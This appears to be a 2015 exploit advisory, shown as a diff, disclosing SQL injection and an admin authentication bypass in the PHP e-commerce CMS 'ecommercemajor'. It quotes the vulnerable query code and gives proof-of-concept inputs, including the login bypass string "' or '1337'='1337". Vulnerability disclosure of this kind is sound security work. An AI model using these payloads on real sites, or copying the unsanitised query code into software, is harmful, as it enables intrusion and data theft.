@@ -1,0 +1,71 @@
+##################################################################################################
+#Exploit Title : ecommercemajor ecommerce CMS SQL Injection and Authentication bypass
+#Author        : Manish Kishan Tanwar
+#Home page Link : https://github.com/xlinkerz/ecommerceMajor
+#Date          : 22/01/2015
+#Discovered at : IndiShell Lab
+#Love to      : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,jagriti,Kishan Singh and ritu rathi
+#email        : manish.1046@gmail.com
+##################################################################################################
+
+////////////////////////
+/// Overview:
+////////////////////////
+
+ecommercemajor is the php based CMS for ecommerce portal
+
+///////////////////////////////
+// Vulnerability Description:
+///////////////////////////////
+
+SQL injection vulnerability:-
+============================== 
+in file product.php data from GET parameter 'productbycat' is not getting filter before passing into SQL query and hence rising SQL Injection vulnerability
+---------------------
+$getallproduct="select * from purchase where status='enable' and catid=$_GET[productbycat] order by id desc";
+---------------------
+POC
+
+http://127.0.0.1/ecommercemajor/product.php?productbycat=SQLI
+
+
+Authentication Bypass:-
+============================== 
+file index.php under directory __admin has SQL injection vulnerability
+parameter username and password suppliedin post parameter for checking valid admin username and password is not getting filter before passing into SQL query which arise authentication bypass issue.
+vulnerable code is 
+-------------------
+	if(isset($_POST[login]))
+		{
+$check="select * from adminlogin where username='$_POST[username]' and password='$_POST[username]'";
+			$checkresult=mysql_query($check);
+			$checkcount=mysql_num_rows($checkresult);
+			if($checkcount>0)
+				{	
+					$checkrow=mysql_fetch_array($checkresult);
+					$_SESSION[adminname]=$checkrow[adminname];
+					$_SESSION[adminloginstatus]="success";
+					echo "<script>window.location='home.php';</script>";
+				}
+--------------------
+POC
+
+open admin panel 
+http://127.0.0.1/ecommercemajor/__admin/
+username: ' or '1337'='1337
+password: ' or '1337'='1337
+
+
+
+                             --==[[ Greetz To ]]==--
+############################################################################################
+#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,
+#Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
+#Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,
+#Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Das
+#############################################################################################
+                             --==[[Love to]]==--
+#Kishan Tanwar,Mrs. Ritu Rathi,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
+#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Don(Deepika kaushik)
+                       --==[[ Special Fuck goes to ]]==--
+                            <3  suriya Cyber Tyson <3
